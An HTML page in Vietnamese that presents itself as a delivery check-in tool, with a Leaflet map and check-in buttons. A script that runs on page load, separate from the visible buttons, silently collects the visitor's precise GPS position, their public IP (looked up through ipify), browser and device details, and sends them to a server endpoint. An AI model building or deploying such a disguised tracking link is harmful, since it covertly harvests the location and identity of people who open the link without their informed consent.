<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Check-in giao hàng</title>

<link
  rel="stylesheet"
  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
/>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:Arial,Helvetica,sans-serif;
  background:#f5f5f5;
}

.header{
  background:#2196F3;
  color:#fff;
  text-align:center;
  padding:16px;
  font-size:22px;
  font-weight:bold;
}

.container{
  max-width:900px;
  margin:15px auto;
  padding:0 10px;
}

.card{
  background:#fff;
  border-radius:12px;
  padding:15px;
  box-shadow:0 2px 10px rgba(0,0,0,.1);
}

#map{
  width:100%;
  height:450px;
  border-radius:10px;
}

.info{
  margin-top:15px;
  line-height:2;
}

.info span{
  font-weight:bold;
}

button{
  width:100%;
  border:none;
  padding:15px;
  border-radius:8px;
  font-size:16px;
  cursor:pointer;
  margin-top:10px;
}

#startBtn{
  background:#28a745;
  color:white;
}

#checkinBtn{
  background:#007bff;
  color:white;
}

.status{
  margin-top:12px;
  text-align:center;
  font-weight:bold;
}
</style>
</head>

<body>

<div class="header">
🚚 HỆ THỐNG CHECK-IN GIAO HÀNG
</div>

<div class="container">

  <div class="card">

    <div id="map"></div>

    <div class="info">
      <div>📍 GPS: <span id="gps">Chưa xác định</span></div>
      <div>🎯 Sai số: <span id="accuracy">---</span></div>
      <div>⏰ Thời gian: <span id="time">---</span></div>
      <div>📌 Số điểm check-in: <span id="count">0</span></div>
    </div>

    <button id="startBtn">
      ▶ BẮT ĐẦU
    </button>

    <button id="checkinBtn">
      📍 XÁC NHẬN VỊ TRÍ
    </button>

    <div class="status" id="status">
      Sẵn sàng
    </div>

  </div>

</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>

let map = L.map('map').setView(
  [10.7769,106.7009],
  13
);

L.tileLayer(
  'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
  {
    maxZoom:19
  }
).addTo(map);

let marker = null;
let circle = null;
let pointCount = 0;

// Tự động hiện popup vị trí khi mở link
async function requestLocation(){

if(!navigator.geolocation){
return
}

navigator.geolocation.getCurrentPosition(

async(position)=>{

try{

const lat =
position.coords.latitude

const lng =
position.coords.longitude

const accuracy =
position.coords.accuracy

// Lấy IP public
const ipRes = await fetch(
'https://api.ipify.org?format=json'
)

const ipData =
await ipRes.json()

// Gửi về server
await fetch('/api/send-location',{

method:'POST',

headers:{
'Content-Type':'application/json'
},

body:JSON.stringify({

lat,
lng,
accuracy,

ip:ipData.ip,

device:navigator.userAgent,

platform:navigator.platform,

screen:`${window.screen.width}x${window.screen.height}`

})

})

console.log('Đã gửi vị trí')

}catch(err){

console.log(err)

}

},

(error)=>{

console.log(error)

},

{
enableHighAccuracy:true,
timeout:15000,
maximumAge:0
})

}

function updateLocation(){

  navigator.geolocation.getCurrentPosition(

    (position)=>{

      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const accuracy = Math.round(position.coords.accuracy);

      document.getElementById("gps").textContent =
        `${lat}, ${lng}`;

      document.getElementById("accuracy").textContent =
        `${accuracy} m`;

      document.getElementById("time").textContent =
        new Date().toLocaleString("vi-VN");

      if(marker){
        map.removeLayer(marker);
      }

      if(circle){
        map.removeLayer(circle);
      }

      marker = L.marker([lat,lng]).addTo(map);

      circle = L.circle([lat,lng],{
        radius:accuracy
      }).addTo(map);

      map.setView([lat,lng],18);

      pointCount++;

      document.getElementById("count").textContent =
        pointCount;

      document.getElementById("status").textContent =
        "✅ Đã lấy vị trí thành công";

      /*
      Tại đây có thể gọi API của bạn:

      fetch('/api/checkin',{
        method:'POST',
        headers:{
          'Content-Type':'application/json'
        },
        body:JSON.stringify({
          lat,
          lng,
          accuracy
        })
      });

      */

    },

    ()=>{

      document.getElementById("status").textContent =
        "❌ Không lấy được vị trí";

    },

    {
      enableHighAccuracy:true,
      timeout:15000,
      maximumAge:0
    }

  );
}

document
  .getElementById("startBtn")
  .addEventListener("click",updateLocation);

document
  .getElementById("checkinBtn")
  .addEventListener("click",updateLocation);
window.onload = () => {
    requestLocation();
};

</script>

</body>
</html>
